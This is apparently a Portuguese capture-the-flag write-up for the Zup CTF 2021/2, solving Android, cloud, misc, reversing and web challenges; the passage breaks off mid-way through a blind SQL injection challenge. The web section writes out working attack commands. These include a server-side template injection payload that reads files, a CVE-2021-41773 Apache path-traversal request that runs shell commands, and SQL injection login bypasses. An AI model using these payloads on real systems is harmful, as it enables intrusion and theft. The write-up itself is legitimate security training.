# :triangular_flag_on_post: CTF Zup 2021/2  Write up 2#


Este documento contém todas as minhas respostas (passo a passo) e ferramentas utilizadas para resolução 
dos desafios do CTF Zup 2021/2 (segundo semestre)

### Categorias
1. [Android](#android1)
    - [Android1](#android1)
    - [Android3](#android3)
    - [Android4](#android4)
    - [Android5](#android5)
    - [Android6](#android6)
2. [Cloud Security](#leak)
    - [Leak](#leak)
    - [Bucket](#bucket)
3. [Misc](#conversa-estranho)
    - [Conversa estranho](#conversa-estranho)
    - [Se FOR fácil, eu MATO!](#se-for-facil-eu-mato!)
    - [Packet](#packet)
4. [Reverse Engineer](#rev1)
    - [REV 01](#rev1)
    - [REV 02](#rev2)
5. [Web Application](#lorem-ipsum)
    - [Lorem Ipsum](#lorem-ipsum)
    - [SSTI](#ssti)   
    - [Login](#login)    
    - [Mayday! AH-64 down!](#mayday!-ah-64-down!)
    - [Blind](#blind)
    - [Welcome to the Juggling](#welcome-to-the-juggling)
7. [Ferramentas](#aws-cli)

## Android :iphone: ##

### Android1 ###

O desafio disponibilizava um link para download de um APK, para encontrar a FLAG bastou fazer o download do arquivo e decompilar utilizando a ferramenta [APK Decompiler](#apk-decompiler). Feito o download do AṔK decompilado, comecei a busca pelo arquivo que normalmente é o principal em uma aplicação Android: `MainActivity.java`. Neste arquivo foi possível encontrar o trecho de código abaixo

```java
    if (pp.equalsIgnoreCase(MainActivity.this.cursor.getString(0))) {
        Toast.makeText(MainActivity.this, "Right Pin, Congratulations", 0).show();
        pin1.removeAllViews();
        String xo = MainActivity.this.getResources().getString(R.string.google_api_key);
        String xo2 = a.func2(new a().func1(xo, xo.substring(4)));
        String xo3 = a.func3(xo2.substring(1), xo2);
        String xo4 = a.func4(xo3, xo3, xo3.substring(2));
        tv1.setText("Flag: " + xo4);
    } else {
        ...
    }
```

Que aparentemente printava a flag apenas em uma condição específica, algo que no entanto não faria diferença dado que tínhamos o fonte em mãos.

A primeira informação que seria necessária para chegar à Flag estava no arquivo `strings.xml`, a constante de nome `google_api_key`

```xml
<string name="google_api_key">R4f/mz5cIi2NHsrnAUGqYWThCTg60fHF1xYUZt73KXxS/mHJwYl41hcJ8R3rvAzuu9MUguemAhc8ydjifc+WiY9oVKZyN9xfscoD95b9BDI=</string>
    <string name="google_api_key2">NGU1NzQ1MzE0ZTU0NTU3NzRkNmQ1MTMwNGQ3YTU1MzA0ZTQ0NTkzMzU5NmE1OTMyNGQ3YTUxMzI0ZDdhNGQ3ODRlNmQ0ZDMxNWE2YTU5MzA0ZDdhNGQzMjVhNDQ0ZDMwNGQ3YTQ1N2E0ZTU0NjQ2Yg==</string>
```

Agora seria necessário entender a implementação que transformaria a constante google_api na flag, para isso bastou buscar no projeto inteiro pela implementação de `func2` e encontrar o trecho de código abaixo

```java
    public static String func2(String val1) {
        try {
            SecretKeySpec secretKey = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("SHA-1").digest("mysecret".getBytes("UTF-8")), 16), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(2, secretKey);
            new String(cipher.doFinal(Base64.decode(val1, 0)));
            cipher.init(1, secretKey);
            return hex2str(new String(Base64.decode("NGU1NzQ1MzE0ZTU0NTU3NzRkNmQ1MTMwNGQ3YTU1MzA0ZTQ0NTkzMzU5NmE1OTMyNGQ3YTUxMzI0ZDdhNGQ3ODRlNmQ0ZDMxNWE2YTU5MzA0ZDdhNGQzMjVhNDQ0ZDMwNGQ3YTQ1N2E0ZTU0NjQ2Yg==", 0)));
        } catch (Exception e) {
            e.printStackTrace();
            return "error";
        }
    }
```

Ao analisar a função, no entanto, percebo que apesar de receber um parâmetro de entrada o seu retorno não considerava esse parâmetro para nada, mas apenas retornava uma string em base64 e hexadecimal. Ao analisar essa String cheguei ao javascript abaixo que nos retorna a flag

```javascript

function hex2a(hexx) {
    var hex = hexx.toString();
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

hex2a(atob(hex2a(atob("NGU1NzQ1MzE0ZTU0NTU3NzRkNmQ1MTMwNGQ3YTU1MzA0ZTQ0NTkzMzU5NmE1OTMyNGQ3YTUxMzI0ZDdhNGQ3ODRlNmQ0ZDMxNWE2YTU5MzA0ZDdhNGQzMjVhNDQ0ZDMwNGQ3YTQ1N2E0ZTU0NjQ2Yg=="))))
````

E pegar a flag => `ZUP-CTF{f4c1l_d3m415}`


### Android3 ###

O desafio disponibilizava um link para download de um APK, para encontrar a FLAG bastou fazer o download do arquivo e decompilar utilizando a ferramenta [APK Decompiler](#apk-decompiler). Feito o download do AṔK decompilado, comecei a busca pelo arquivo que normalmente é o principal em uma aplicação Android: `MainActivity.java`. Neste arquivo foi possível encontrar o trecho de código abaixo

```java
public void callNotFlag(View view) {
        startActivity(new Intent(this, NotFlagActivity.class));
}
```

Parece que tentaram nos contar de uma forma engraçada que a flag não estaria nesse mesmo lugar. Procuro então pela existência do arquivo `FlagActivity.java`
e ele sim possui menção para a flag

```java
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag);
        ((TextView) findViewById(R.id.textView2)).setText(decode(getString(R.string.ctf_id))); //interessante...
    }

    public static String decode(String hexStr) {
        StringBuilder output = new StringBuilder("");
        for (int i = 0; i < hexStr.length(); i += 2) {
            output.append((char) Integer.parseInt(hexStr.substring(i, i + 2), 16));
        }
        return output.toString();
    }
```

Procuro pela constante ctf_id no `strings.xml` e lá estava a flag em hexadecimal

```xml
<string name="ctf_id">5a55502d4354467b33617a594063743176317479466c40677d</string>
```

Que convertida em texto plano nos dá a flag `ZUP-CTF{3azY@ct1v1tyFl@g}`


### Android4 ###

O desafio disponibilizava um link para download de um APK, para encontrar a FLAG bastou fazer o download do arquivo e decompilar utilizando a ferramenta [APK Decompiler](#apk-decompiler). Feito o download do AṔK decompilado, comecei a busca pelo arquivo que normalmente é o principal em uma aplicação Android: `MainActivity.java`. Neste arquivo foi possível encontrar o trecho de código abaixo

```java
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    PrintStream printStream = System.out;
    printStream.println("FLAG ---> " + getString(R.string.flag));
}
```

Procuro pela constante flag no `strings.xml` e encontro mais algumas constantes curiosas

```xml
<string name="flag">XGb2biXx5Qd6w5Zt5Z6tcRr1JLNAoKjnGRUhZNCdUjC+Nazc/u+Q20s2LtIM2fRQ</string>
...
<string name="password">4372797074305365637233744b337921</string>
<string name="salt">73616c747a7570</string>
```

Percebo que são, respectivamente a senha e o salt configurados para criptografar a flag, procuro então no resto do projeto por menção do algoritmo de criptografia e encontro o arquivo `AESUtils.java`

```java
public class AESUtils {
    public static String decode(String hexStr) {
        StringBuilder output = new StringBuilder("");
        for (int i = 0; i < hexStr.length(); i += 2) {
            output.append((char) Integer.parseInt(hexStr.substring(i, i + 2), 16));
        }
        return output.toString();
    }

    public static String encrypt(String algorithm, String input, SecretKey key, IvParameterSpec iv) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        Cipher cipher = Cipher.getInstance(algorithm);
        cipher.init(1, key, iv);
        return Base64.getEncoder().encodeToString(cipher.doFinal(input.getBytes()));
    }

    public static String decrypt(String algorithm, String cipherText, SecretKey key, IvParameterSpec iv) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        Cipher cipher = Cipher.getInstance(algorithm);
        cipher.init(2, key, iv);
        return new String(cipher.doFinal(Base64.getDecoder().decode(cipherText)));
    }

    public static SecretKey getKeyFromPassword(String password, String salt) throws NoSuchAlgorithmException, InvalidKeySpecException {
        return new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(password.toCharArray(), salt.getBytes(), 65536, 256)).getEncoded(), "AES");
    }

    public static IvParameterSpec generateIv(String password) {
        return new IvParameterSpec(password.getBytes());
    }
}
```

Bastou então utilizar a implementação dessa classe para descobrir a flag `ZUP-CTF{4ndr0idEncrypt10nEZFl4g}`


### Android5 ###

O desafio disponibilizava um link para download de um APK, para encontrar a FLAG bastou fazer o download do arquivo e decompilar utilizando a ferramenta [APK Decompiler](#apk-decompiler). Feito o download do AṔK decompilado, comecei a busca pelo arquivo que normalmente é o principal em uma aplicação Android: `MainActivity.java`. Neste arquivo foi possível encontrar o trecho de código abaixo

```java
    public native String stringFromJNI();

    static {
        System.loadLibrary("ctfandroid0x02");
    }

    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        this.binding = inflate;
        setContentView(inflate.getRoot());
    }

```

O que me chamou bastante atenção é que nesse caso era feito menção para uma biblioteca `ctfandroid0x02`, o que indicava que muito provavelmente a flag estaria dentro de um binário. Procuro por esse arquivo dentro do decompilado e após encontrá-lo faço upload na ferramenta [Online Disassembler](#online-disassembler) e imediatamente encontro strings muito interessantes

![Online Disassmbler](/android/android5/001.png)

Bastou então fazer um request para o endereço `18.229.209.50/d1bf8fc6af9166875316587ad697a719.zip` e fazer o download de um .zip cuja senha era `N4t1v3L1br4ry`.
Após abrir o arquivo lá estava a flag em base64, que após decodificada retornava => `ZUP-CTF{34zyN4t1v3C0d34ndr01d}`


### Android6 ###


O desafio disponibilizava um link para download de um APK, para encontrar a FLAG bastou fazer o download do arquivo e decompilar utilizando a ferramenta [APK Decompiler](#apk-decompiler). Feito o download do AṔK decompilado, encontrei após alguma buscas (iniciando pelo MainActivity novamente) o arquivo `HomeActivity.java`, esse arquivo continha o código abaixo


```java
    if (Boolean.valueOf(d.d()).booleanValue()) {
        System.out.println("Tsc, tsc, tsc. Com root não pode acessar. Ou será que dá?");
        System.exit(1);
    }
    if (!getIntent().getStringExtra("TOKEN").equals("f399bb07afb9c2e6cf79458ec67a729c6915f8be")) {
        finish();
    }
    String decodedFlag = "";
    String algorithm = a.a(getString(R.string.algorithm));
    String password = a.a(getString(R.string.f4902p));
    String salt = a.a(getString(R.string.salt));
    IvParameterSpec iv = a.c(a.a(getString(R.string.chave)));
    try {
        decodedFlag = a.b(algorithm, getString(R.string.result_id), a.d(password, salt), iv);
    } catch (InvalidAlgorithmParameterException | InvalidKeyException | NoSuchAlgorithmException | InvalidKeySpecException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e2) {
        e2.printStackTrace();
    }

```
E novamente ficou claro que a flag estava criptografada e disponível no arquivo `strings.xml`, bem como o password e salt. 

```xml
<string name="p">417a6572747975696f7031</string>
<string name="result_id">USeUlhwp8DrMRil/ztVecRjKkmwOUysWsdb7B1hixb64LB8OKJye+HIfbcSmr4yO</string>
<string name="salt">69756766726562696f</string>
```

Após descriptografar usando a mesma classe AESUtils obtemos a flag => `ZUP-CTF{th4ts4n0th3r34sy4ndr01dfl4g}`


## Cloud Security :cloud: ##

### Leak ###

Esse desafio nos dava a seguinte dica

```
O Desenvolvedor subiu uma instancia, mas deixou vazar uma informação, voce consegue achar ?

AKIAUYWIIKCH5EVUP7NI 5xhAfuEFlvMv/IjDB6Z+wDeNkNnXgNNiqhqJDcb1
```

Após inferir que se tratava de credenciais aws bastou rodar o script abaixo, fazendo uso do aws-cli para chegar na flag

```bash
export AWS_ACCESS_KEY_ID=AKIAUYWIIKCH5EVUP7NI
export AWS_SECRET_ACCESS_KEY=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
aws ec2 describe-instances | grep "ZUP" -A2
```

A flag era => `ZUP-CTF{mUit0-f-4-c-1l}`


### Bucket ###

Esse desafios nos apresentava uma página html disponível no endereço http://website-gg.s3-website-sa-east-1.amazonaws.com/
Ao acessar a página era possível ver um gif hospedado em um bucket de endereço https://gif-hacker.s3.sa-east-1.amazonaws.com, ao acessar a raiz de tal bucket nos era retornada toda a estrutura de arquivos e dentro eles a nossa flag.txt

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>gif-hacker</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>flag.txt</Key>
<LastModified>2021-08-16T13:49:18.000Z</LastModified>
<ETag>"822e8fca64391eb71885361918aec074"</ETag>
<Size>22</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
<Key>giphy.gif</Key>
<LastModified>2021-08-16T13:40:05.000Z</LastModified>
<ETag>"f346fc6faf93a4837c2362fb5e58096b"</ETag>
<Size>3106394</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

A flag, que estava disponível em https://gif-hacker.s3.sa-east-1.amazonaws.com/flag.txt era => `ZUP-CTF{Easy_on3_flag}`


## Misc :earth_americas: ##

### Conversa estranho ###

Esse desafio nos disponibilizava um arquivo txt com o conteúdo abaixo

```
.-.. --- .-. . -- / .. .--. ... ..- -- / -.. --- .-.. --- .-. / ... .. - / .- -- . - --..-- / -.-. --- -. ... . -.-. - . - ..- .-. / .- -.. .. .--. .. ... -.-. .. -. --. / . .-.. .. - .-.-.- / -.-. ..- .-. .- -... .. - ..- .-. / ... . -.. / .--. ..- .-. ..- ... / -. --- -. / . ... - / ..-. . .-. -- . -. - ..- -- / .- .-.. .. --.- ..- . - .-.-.- / -.-. ..- .-. .- -... .. - ..- .-. / . ... - / -- .- ... ... .- --..-- / -.-. --- -- -- --- -.. --- / --.- ..- .. ... / -- .- - - .. ... / .- --..-- / - . -- .--. --- .-. / -. --- -. / .-.. .. --. ..- .-.. .- .-.-.- / -. ..- -. -.-. / ..- - / .-. ..- - .-. ..- -- / ..-. . .-.. .. ... --..-- / -. --- -. / -- .- -..- .. -- ..- ... / .-. .. ... ..- ... .-.-.- / ..-. ..- ... -.-. . / .- - / ..- .-.. - .-. .. -.-. .. . ... / .--- ..- ... - --- .-.-.- / -.-. .-. .- ... / - . -- .--. --- .-. / . .-. .- - / .-.. .- -.-. ..- ... --..-- / . - / .-. .... --- -. -.-. ..- ... / -.. .. .- -- / -.. .- .--. .. -... ..- ... / .. -. .-.-.- / .. -. - . .-. -.. ..- -- / . - / -- .- .-.. . ... ..- .- -.. .- / ..-. .- -- . ... / .- -.-. / .- -. - . / .. .--. ... ..- -- / .--. .-. .. -- .. ... / .. -. / ..-. .- ..- -.-. .. -... ..- ... .-.-.- / -. .- -- / -.. .. .- -- / .-.. .. -... . .-. --- --..-- / ...- . ... - .. -... ..- .-.. ..- -- / . --. . - / .- .-. -.-. ..- / .- --..-- / .- .-.. .. --.- ..- . - / ... ..- ... -.-. .. .--. .. - / -. ..- .-.. .-.. .- .-.-.- / ... . -.. / ..- .-.. - .-. .. -.-. . ... / .- -. - . / . --. . - / ..-. .- ..- -.-. .. -... ..- ... / ...- .- .-. .. ..- ... .-.-.- / --.- ..- .. ... --.- ..- . / . --. . ... - .- ... / -... .. -... . -. -.. ..- -- / .--- ..- ... - --- --..-- / .- / - .-. .. ... - .. --.- ..- . / - ..- .-. .--. .. ... / .-. .... --- -. -.-. ..- ... / .- -.-. .-.-.- / -. ..- .-.. .-.. .- -- / -.-. --- -. -.. .. -- . -. - ..- -- / ... . -- .--. . .-. / ... . -- .--. . .-. .-.-.- / ... . -.. / .--. .-.. .- -.-. . .-. .- - / .-.. --- .-. . -- / -. --- -. / .-.. . --- / ..-. .. -. .. -... ..- ... / --. .-. .- ...- .. -.. .- .-.-.- / ...- .. ...- .- -- ..- ... / .. -. / -.. ..- .. / . ..- / .-.. . -.-. - ..- ... / -- .- - - .. ... / . .-.. . .. ..-. . -. -.. / .- / -. --- -. / ... . -- .-.-.- .. -. / ...- --- .-.. ..- - .--. .- - --..-- / ..-. . .-.. .. ... / .. -.. / ..-. . .-. -- . -. - ..- -- / -.-. --- -. ... . --.- ..- .- - --..-- / . .-. .- - / ...- . .-.. .. - / . .-.. . .. ..-. . -. -.. / - . .-.. .-.. ..- ... --..-- / .- - / ..-. .- -.-. .. .-.. .. ... .. ... / -. .. ... .. / -. .. -... .... / . ..- / .-. .. ... ..- ... .-.-.- / ... . -.. / ..- .-.. .-.. .- -- -.-. --- .-. .--. . .-. / --- .-. -. .- .-. . / .-.. ..- -.-. - ..- ... .-.-.- / .--. . .-.. .-.. . -. - . ... --.- ..- . / -. --- -. / -- . - ..- ... / -. .. ... .-.. .-.-.- / -.. --- -. . -.-. / -.-. --- -. -.. .. -- . -. - ..- -- / ..- .-. -. .- / -- .. --..-- / .. -. / ...- .- .-. .. ..- ... / - --- .-. - --- .-. / -... .. -... . -. -.. ..- -- / -. --- -. .-.-.- / -.. ..- .. ... / ..- - / ... . -- / ... .. - / .- -- . - / ..- .-. -. .- / ..-. .- -.-. .. .-.. .. ... .. ... / -- .- -..- .. -- ..- ... .-.-.- / .. -. - . --. . .-. / . .-.. . .. ..-. . -. -.. --..-- / -.. .. .- -- / ...- .. - .- . / .--. .-.. .- -.-. . .-. .- - / .. .- -.-. ..- .-.. .. ... --..-- / - --- .-. - --- .-. / .--- ..- ... - --- / .. .- -.-. ..- .-.. .. ... / .- -. - . --..-- / .--. --- .-. - - .. - --- .-. / .-. .... --- -. -.-. ..- ... / .--. ..- .-. ..- ... / . .-. --- ... / ..- - / .- -. - . .-.-.- / -.. --- -. . -.-. / . --. . ... - .- ... / - .. -. -.-. .. -.. ..- -. - / -. .. -... .... / .. -.. / .- -.-. -.-. ..- -- ... .- -. .-.-.- / ..-. ..- ... -.-. . / --.- ..- .. ... / -- .- ..- .-. .. ... / -... .-.. .- -. -.. .. - --..-- / .-.. --- -... --- .-. - .. ... / .--- ..- ... - --- / . ..- --..-- / -.-. ..- .-. ... ..- ... / -. .. -... .... .-.-.- / -.. ..- .. ... / .-.. --- -... --- .-. - .. ... / -. ..- .-.. .-.. .- / .- -.-. / -- .- .-.. . ... ..- .- -.. .- / - . -- .--. --- .-. .-.-.- / . - .. .- -- / -. --- -. / - . -- .--. ..- ... / -. ..- -. -.-. .-.-.- / .- . -. . .- -. / .--. . .-.. .-.. . -. - . ... --.- ..- . / .. -.. / .- -. - . / -. --- -. / . ..- .. ... -- --- -.. .-.-.- / -.. --- -. . -.-. / . -. .. -- / -- . - ..- ... --..-- / ..-. .-. .. -. --. .. .-.. .-.. .- / . ..- / .-. ..- - .-. ..- -- / ...- .. - .- . --..-- / ... ..- ... -.-. .. .--. .. - / -. . -.-. / ..-. . .-.. .. ... .-.-.- / ... . -.. / ..- .-.. - .-. .. -.-. . ... / . .-. .- - / ... . -- --..-- / .- -.-. / ... --- -.. .- .-.. . ... / .-. .. ... ..- ... / .-. .... --- -. -.-. ..- ... / -. --- -. .-.-.- / -.. ..- .. ... / --.. ..- .--. -....- -.-. - ..-. --. .-. --- .-- - .... -- ----- .-. ... . -.-. ----- -.. .. -. --. / .- ..- -.-. - --- .-. / ..-. .. -. .. -... ..- ... / ...- . .-.. .. - / ... . -.. / - .. -. -.-. .. -.. ..- -. - .-.-.- / ..-. ..- ... -.-. . / -.. .. --. -. .. ... ... .. -- / ..-. . ..- --. .. .- - / .-.. . --- --..-- / .- / .- .-.. .. --.- ..- . - / .- -. - . / ... -.-. . .-.. . .-. .. ... --.- ..- . / . - .-.-.-
```

Ao perceber que se tratava de morse bastou acessar e decodificar usando o serviço morsedecoder.com para chegar no texto abaixo

```
LOREM IPSUM DOLOR SIT AMET, CONSECTETUR ADIPISCING ELIT. CURABITUR SED PURUS NON EST FERMENTUM ALIQUET. CURABITUR EST MASSA, COMMODO QUIS MATTIS A, TEMPOR NON LIGULA. NUNC UT RUTRUM FELIS, NON MAXIMUS RISUS. FUSCE AT ULTRICIES JUSTO. CRAS TEMPOR ERAT LACUS, ET RHONCUS DIAM DAPIBUS IN. INTERDUM ET MALESUADA FAMES AC ANTE IPSUM PRIMIS IN FAUCIBUS. NAM DIAM LIBERO, VESTIBULUM EGET ARCU A, ALIQUET SUSCIPIT NULLA. SED ULTRICES ANTE EGET FAUCIBUS VARIUS. QUISQUE EGESTAS BIBENDUM JUSTO, A TRISTIQUE TURPIS RHONCUS AC. NULLAM CONDIMENTUM SEMPER SEMPER. SED PLACERAT LOREM NON LEO FINIBUS GRAVIDA. VIVAMUS IN DUI EU LECTUS MATTIS ELEIFEND A NON SEM.IN VOLUTPAT, FELIS ID FERMENTUM CONSEQUAT, ERAT VELIT ELEIFEND TELLUS, AT FACILISIS NISI NIBH EU RISUS. SED ULLAMCORPER ORNARE LUCTUS. PELLENTESQUE NON METUS NISL. DONEC CONDIMENTUM URNA MI, IN VARIUS TORTOR BIBENDUM NON. DUIS UT SEM SIT AMET URNA FACILISIS MAXIMUS. INTEGER ELEIFEND, DIAM VITAE PLACERAT IACULIS, TORTOR JUSTO IACULIS ANTE, PORTTITOR RHONCUS PURUS EROS UT ANTE. DONEC EGESTAS TINCIDUNT NIBH ID ACCUMSAN. FUSCE QUIS MAURIS BLANDIT, LOBORTIS JUSTO EU, CURSUS NIBH. DUIS LOBORTIS NULLA AC MALESUADA TEMPOR. ETIAM NON TEMPUS NUNC. AENEAN PELLENTESQUE ID ANTE NON EUISMOD. DONEC ENIM METUS, FRINGILLA EU RUTRUM VITAE, SUSCIPIT NEC FELIS. SED ULTRICES ERAT SEM, AC SODALES RISUS RHONCUS NON. DUIS ZUP-CTFGROWTHM0RSEC0DING AUCTOR FINIBUS VELIT SED TINCIDUNT. FUSCE DIGNISSIM FEUGIAT LEO, A ALIQUET ANTE SCELERISQUE ET.
```
e encontrar a flag => `ZUP-CTFGROWTHM0RSEC0DING`


### Se FOR fácil, eu MATO! ###


Esse desafio apresentava uma url que tinha a seguinte imagem

![Se FOR fácil eu mato](/misc/i-kill/001.png)

E continha ainda o link para download de um binário. Após abrir o binário no [Online Disassembler](#online-disassembler) bastou buscar pela string ZUP para encontrar a flag

![Se FOR fácil eu mato](/misc/i-kill/002.png)

E a flag era `ZUP-CTF{34syf0rm4t5tr1ngfl4g}` (acho que não era pra ser tão fácil rs)


### Packet ###

Esse desafio nos mostra o hexadecimal abaixo

```
005056fbac52000c292f887208004500008398fb400040062d5fac10af8512e6059faea827246c9da0af05a47d585018faf074900000474554202f6173646667686a6b6c20485454502f312e310d0a486f73743a2031382e3233302e352e3135393a31303032300d0a557365722d4167656e743a206375726c2f372e37342e300d0a4163636570743a202a2f2a0d0a0d0a
```

Que ao ser decodificado se mostra ser os detalhes de um request curl

```
GET /asdfghjkl HTTP/1.1
Host: 18.230.5.159:10020
User-Agent: curl/7.74.0
Accept: */*
```

Bastou então executar tal request usando o comando

```bash
curl 18.230.5.159:10020/asdfghjkl
```

para obter a flag => `ZUP-CTF{p4ck37}`


## Reverse Engineer :mag: ##

### REV1 ###


Esse desafio nos dava um binário e também o seu código fonte original, ao executar o binário era possível printar algumas formas geométricas divertidas.
Ao acionar a opção de círculos era apresentada a mensagem abaixo

![Reverse01](/reverse/rev1/001.png)

Ao analisar o fonte, bastou remover alguns IFs dessa função, responsável pela validação da tal chave e compilar a nova versão do código.

```bash
gcc -Wall 'CODIGO-FONTE.c' -o novocompilado -lssl -lcrypto
```

Executando o binário novo qualquer chave servia, e com isso a flag `ZUP-CTF{P1ec3_0f_C4kE}` era printada

![Reverse01](/reverse/rev1/002.png)


### REV2 ###

Esse desafio nos dava um binário, porém diferentemente do primeiro, sem disponibilizar seu fonte. Esse binário comemorava o aniversário da ZUP com a mensagem abaixo

![Reverse02](/reverse/rev2/001.png)

Ao digitar uma senha qualquer naturalmente nenhuma flag era printada. Após alguma pesquisa descubro a ferramenta [gdb](#gdb) que possibilita debugar um binário em execução,
mas para isso precisaria primeiro entender um pouco do seu código e utilizei então a ferramente [objdump](#objdump)

Executei então o comando abaixo para listar um pedaço da execução do código, focando na função de strcmp do C que provavelmente estaria sendo invocada para
comparação da senha digitada com a senha esperada

```bash
objdump -d rev_02.elf | grep -A50 strcmp
```

E obtive com isso o código abaixo

![Reverse02](/reverse/rev2/002.png)

Foi possível perceber que se eu setasse o valor da variável %eax% (em `179c`) para 0 durante a execução desse código utilizando a ferramenta [gdb](#gdb), a flag seria printada independentemente da senha informada, para isso basta executar o comando abaixo

```shell
gdb
file rev_02.elf
break *0x000055555555579c
run
set $eax=0x00
continue
```

E por fim a flag é printada => `flag{g3tT1nG_H4rdEr}`


## Web Application :globe_with_meridians: ##

### Lorem Ipsum ###

Esse desafio nos trazia o endereço https://zup-loremipsu.chals.io que direcionava a uma página html simples, ao inspecionar seu conteúdo foi possível ver um comentário contendo o código morse abaixo:

```html
<!-- â€“â€“         
                    -..-. -- ----- .-. ..... ...-- -.-. ----- -.. ...-- .-.-.- - -..- -
                â€“â€“-->
```

Que, após decodificado gerava a string `/M0R53C0D3.TXT`. Bastou então acessar o endereço https://zup-loremipsu.chals.io/M0R53C0D3.TXT e achar a flag, que estava em base64 e após decodificada retornava a flag => `ZUP-CTF{m0r53_c0d3}`

### SSTI ###

Esse desafio nos dava uma dica muito importante em seu nome, SSTI é um acrônimo para Server Side Template Injection, injeção de código em engines de template. Ao acessar a url https://zup-ssti.chals.io/ foi possível ver o html abaixo

```html
Hello undefined
```

E de posse de mais uma informação importante analisando os headers de retorno do servidor, que foi o header `X-Powered-By: Express` foi possível identificar que o SSTI seria em um código NodeJS. Certamente haveria algum parâmetro de entrada para que pudéssemos explorar a falha, tento então utilizar o query string `name` para
verificar se era essa a nossa entrada e para a minha felicidade vejo surtir o efeito esperado quando o html abaixo é retornado

https://zup-ssti.chals.io/?name='Leo'

```html
Hello Leo
```

Após algumas pesquisas cheguei nas chamadas abaixo

```shell
curl -g "https://zup-ssti.chals.io/?name={{require('fs').readdirSync('.')}}"
curl -g "https://zup-ssti.chals.io/?name={{require('fs').readFileSync('key.txt')}}"
```

Para obter, respectivamente, os retornos abaixo

```shell
Hello .git,Dockerfile,app.js,key.txt,node_modules,package-lock.json,package.json

Hello ZUP-CTF{W3b_pr0_Pr0cton}
```

E com isso conseguir a flag => `ZUP-CTF{W3b_pr0_Pr0cton}`

### Login ###

Esse desafio nos apresentava a url http://18.228.46.98:10010/ e um formulário solicitando que fosse feito login como admin

![Login](/web/login/001.png)

Ao inspecionar melhor a resposta do servidor através do comando abaixo

```shell
curl -v http://18.228.46.98:10010/ 
```

Foi possível verificar uma diretiva `Set-Cookie` indicando o que provavelmente seria o select utilizado por trás do login

```shell
Set-Cookie:hint=select+*+from+users+where+username='admin'+and+password='md5($password,+true)'
```

Percebo que a string admin estava fixa e apenas a senha poderia ser alvo de injeção, porém esse input estava sendo convertido para md5 antes de que pudéssemos fazer qualquer tentativa de SQL Injection.
Após alguma pesquisa, no entanto, descubro que existe uma forma de ainda assim explorar esse código, pois o hash é enviado em binário para o db, e nesse caso precisamos encontrar um hash que, por exemplo, gere um output que contenha a string '='.
Utilizei para isso o script python disponível neste repositório https://github.com/seunghunoh57/SQL-Injection e com ele cheguei até o request abaixo

```shell
curl -v 'http://18.228.46.98:10010/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=admin&password=672847409875712733984791290'
```

E agora sim temos a nossa flag numa diretiva de cookie

```shell
Set-Cookie: flag=ZUP-CTF%7Br1ck_54nch3z%7D
```

A flag era => `ZUP-CTF{Br1ck_54nch3z}`

### Mayday! AH-64 down! ###

Esse desafio nos dava a url https://zup-vuln.chals.io/, que direciona para a página default de um servidor Apache, analisando seu retorno é possível descobrir a exata versão em execução através do comando abaixo

```shell
curl -i https://zup-vuln.chals.io/
```

O que nos retorna

```shell
HTTP/1.1 200 OK
Date: Fri, 03 Dec 2021 13:38:52 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html

<html><body><h1>It works!</h1></body></html>

```


De posse da informação que a versão era a 2.4.49 bastou procurar por alguma vulnerabilidade relacionada a essa versão e cheguei ao CVE `CVE-2021-41773`, que permitiria exploração de RCE. Após essa conclusão e alguma navegação nos diretórios do servidor cheguei no código abaixo que revelou a flag

```shell
curl 'https://zup-vuln.chals.io//cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; cat ../../../../../home/www-data/flag.txt'

```

A flag era => `CTF-ZUP{@p4ch3httpd2449cv3202141773fl@g}`


### Blind ###

Esse desafio nos apresentava a url https://zup-blind.chals.io/?id=2 e dizia que o admin havia esquecido sua senha. A maior dica aqui estava no nome do desafio,
blind, que remetia a Blind sql injection, que se trata de uma vulnerablidade onde podemos sim explorar comandos sql, porém sem ter o retorno dessa execução de forma explícita.
Ao alterar o query string id incluindo uma aspas simples é possível validar que se trata mesmo de sql injection conforme o código abaixo

```shell
curl "https://zup-blind.chals.io/?id=2'"
```

Que nos retornava

```shell
Traceback (most recent call last):
  File "/source/blinSql.py", line 41, in do_GET
    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
sqlite3.OperationalError: unrecognized token: "'"
```

Aparentemente a consulta estava vulnerável a SQL Injection, tentei então tornar o desafio um pouco mais fácil e fazer com que, através de um UNION, conseguisse
retornar uma consulta SQL arbitrária, que no caso retornaria a senha no lugar do nome, por exemplo

```shell
curl "https://zup-blind.chals.io/?id=2+union+all+select+name,password,3,4+from+users"
```

Porém haviam premeditado meus movimentos :( e o retorno foi

```html
<!DOCTYPE html>
<html>
<head>
